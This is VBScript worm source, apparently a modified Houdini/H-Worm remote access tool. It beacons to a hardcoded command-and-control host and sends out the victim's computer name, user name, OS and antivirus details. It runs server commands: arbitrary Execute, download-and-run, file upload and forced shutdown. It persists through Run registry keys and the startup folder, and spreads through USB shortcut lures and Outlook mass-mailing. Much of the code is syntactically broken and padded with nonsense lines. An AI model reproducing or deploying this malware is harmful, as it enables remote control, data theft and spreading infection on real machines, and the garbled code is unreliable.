'=-=-=-=-= Created By dipsan.dhimalme@gmail.com =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "freddyfazbear.us.gov"
port = 4729
installdir = "%temp%"
lnkfile = True
lnkfolder = True

'=-=-=-=-= pubilc var =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")

'=-=-=-=-= private var =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<kuv|ksv>"
sleep = 1000
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

user()
instance

While true

install

response = ""
response = post("is-re","")
cmd = Split(response,spliter)
select case cmd(1)
case "del"
    wscript.quit
case "execute"
    param = cmd(1)
    Execute(param)
case "upl"
    param = Mid(response, instr(spliter, "<kuv|ksv>") + 1)
    oneonce.Close
    set oneonce = filesystemobj.CreateTextFile(installdir & installname)
    oneonce.Write param
    oneonce.close
    shellobj.run "wscript.exe //b" & chr(34) & installdir & installname & chr(34)
    WScript.Quit
case "restart"
    shellobj.run "%comspec% /c shutdown /r /t 00 /f",0, TRUE
case "shutdown"
    shellobj.run "%comspec% /c shutdown /s /t 00 /f",0, TRUE
case "uninstall"
    uninstall
case "up-n-exc"
    download cmd(1),cmd(2)
case "pic"
    pic = "[pornpussyfire]"
    upload installdir & pic & cmd(1), "burned"
case "down-n-exc"
    sitedownloader cmd(1),cmd(2)
case "post"
    post cmd(1),cmd(2)
case "base64"
    decodebase64bin cmd(1),cmd(2)
end select

wscript.sleep sleep

wend

function taskmanager()
set taskmanager = filesystemobj.GetFile(filesystemobj.getfolder("System32") & "/" & "taskmgr.exe")
taskmanager.EndTask = "explorer.exe"
shellobj.run "cmd /c taskmgr"
if endtask = false then
    shellobj.RegRead("HKLM/Softwar/Microsoft/Windows/CurrentVersion")
end if
endtask = true
end function

sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub

function post(cmd, param)

post = param
httpobj.open "post", "https://" & host & ":" & port & "/" & cmd, false
httpobj.setrequesterheader "User-Agent:", information
httpobj.send param
post = httpobj.responsebody
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter
    
    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
        inf = inf & osinfo.caption & spliter & osinfo.ServicePack
        country = osinfo.countrycode
        exit for
    next
    inf = inf & "4.2 PLUS" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    inf = inf & control()
    inf = "J-Worm" & spliter & inf & spliter & "Virus C&C" & spliter & country
    information = inf
else
    information = inf
end if

sub upstart
On Error Resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub

function hwid
On Error Resume Next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = "JWORM Houdini" & disk.volumeserialnumber
        exit for
    end if
next
end function

function security
on error resume next

security = ""
    
set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
     osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
    
set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
    
for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
Next
if security  = "" then security  = "nan-av"
end function

function instance
On Error Resume Next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If

upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function

function upload(fileurl, smcmd)
    dim  httpobj,objstreamuploade,buffer
    set  objstreamuploade = createobject("adodb.stream")
    with objstreamuploade 
         .type = 1 
         .open
         .loadfromfile fileurl
         buffer = .read
         .close
    end with
    set objstreamdownload = nothing
    set httpobj = createobject("msxml2.xmlhttp")
    httpobj.open "post","http://" & host & ":" & port &"/" & smcmd, false
    httpobj.setrequestheader "user-agent:",information
    httpobj.send buffer
end function

sub download(fileurl, filedir)
if filedir = "" then 
    filedir = installdir
end if
 
strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "orderpiza" & spliter & fileurl, false
objhttpdownload.setrequestheader "user-agent:",information
objhttpdownload.send ""
      
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
     objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
    set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
        .type = 1 
        .open
        .write objhttpdownload.responsebody
        .savetofile strsaveto
        .close
    end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
    shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub

sub sitedownloader(fileurl, filedir)
    strlink = fileurl
    strsaveto = installdir & filename
    set objhttpdownload = createobject("msxml2.serverxmlhttp" )
    objhttpdownload.open "get", strlink, false
    objhttpdownload.setrequestheader "cache-control", "max-age=0"
    objhttpdownload.send
    
    set objfsodownload = createobject ("scripting.filesystemobject")
    if  objfsodownload.fileexists (strsaveto) then
        objfsodownload.deletefile (strsaveto)
    end if
     
    if objhttpdownload.status = 200 then
       dim  objstreamdownload
       set  objstreamdownload = createobject("adodb.stream")
       with objstreamdownload
            .type = 1 
            .open
            .write objhttpdownload.responsebody
            .savetofile strsaveto
            .close
       end with
       set objstreamdownload = nothing
    end if
    if objfsodownload.fileexists(strsaveto) then
       shellobj.run objfsodownload.getfile (strsaveto).shortpath
    end if 
end sub

function user()
On Error Resume Next

set installhttp = CreateObject("Msxml2.Xmlhttp")
installhttp.open "post", "https://" host & ":" & port & "/" & "location" & cmd, false
installhttp.setrequesterheader "google.com/maps", "Location=1 Info:" & information
installhttp.send

if virus = "" then
    virus = False
end if

link = "https://www.youtube.com/results?search_query=r63"
set http = CreateObject("Msxml2.Xmlhttp")
http.open "get", link, false
http.send

set downloadab = CreateObject("Adodb.Stream")
downloadab.type = 9
downloadab.open
downloadab.Write http.responsebody
downloadab.savetofile "*.mp4"
downloadab.close
end function

virus = "Jworm Houdini"
for virus = File to filesystemobj.getfile(installname)
    file = path & installname
    if notf = "VIRUS FOUNDED" then exit for
next 

function EmailwormAndJWorm()
On Error Resume Next
set OutlookWshShell = CreateObject("Outlook.Application")
set MailAPI = OutlookWshShell.GetNameSpace("MAPI")
for ListIndex=1 In MailAPI.AddressList.Count
    set AddressBookPeople = MailAPI.AddressList
    for AddressIndex=1 In AddressBookPeople.AddressEntries.Count
        MailAddressLocation = AddressBookPeople.AddressEntries(AddressIndex)
        set mail = OutlookWshShell.CreateItem(0) & shellobj.CreateItem(0)
        mail.Recipients.Add(AddressIndex & "dipsan.dhimal@gmail.com")
        mail.Subject = "Important"
        mail.Body = "Hey You There, Click File"
        mail.Attachment.Add(path & installname)
        mail.send 
        If MailSended = True Then
            Exit For
        End If
    next
    exit for
Next 

JWorm = "Carpet Houdini C&C Worm"
set httpdownload = CreateObject("Msxml2.XmlHttp")
httpdownload.open "post", "https://" & host & ":" & port & "/" & "porn.html" & cmd,false
httpdownload.setrequesterheader "Search:", "Fnaf Porn"
httpdownload.send
end function

function decodebase64bin(filename, code)
dim xml, adodbNow, CharBase64
if filename = "" then
    filesystemobj.CreateTextFile(filename)
end if
CharBase64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIKLMNOPQRSTUVWXYZ=-/1234567890"

set xml = CreateObject("Microsoft.XMLDOM").createElement("tmp")
xml.DataType = "bin.base64"
xml.Text = code & CharBase64

set adodbNow = CreateObject("ADODB.Stream")
adodbNow.type = 1
adodbNow.Open
adodbNow.Write xml.NodeTypedValue
adodbNow.Position = 0
adodbNow.Type = 2
adodbNow.CharSet = "us-ascii"
decodebase64bin = adodbNow.ReadText
adodbNow.Savetofile filename
end function

sub nsf
On Error Resume Next
Dim ShellApp, Sexy, Magnet, vkey, check, St, s
Set ShellApp = WScript.CreateObject("Shell.Application")
Set Sexy = ShellApp.NameSpace(&H27)
Magnet =Sexy.ConnectServer("https://" & host & ":" & port & "/").CreateHttpSite

set check = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
check.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies","EnableTime",1
check.SetSZValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Sn",startup,0
check.EnumKey &H80000002,"SOFTWARE\Microsoft\Windows", St
for each vkey in St
    if Mid("Regedit", InStr(vkey,"s")) then
        s= vkey
    end if
    Exit for
next
nsf = s
end sub
    
function final()
On Error Resume Next
dim fork

final = ""

final = post(cmd(1),cmd(2))
final = sitedownloader(cmd(1),cmd(2))
final = download(cmd(1),cmd(2))
final = upload(cmd(1),cmd(2))

if fork = "0|0" Then
    shellobj.run "%comspec% /c " & fork
end if

taskmanager
for each forks in fork
    forks= "ksksk"
    if hacked = false then exit for
next
end function
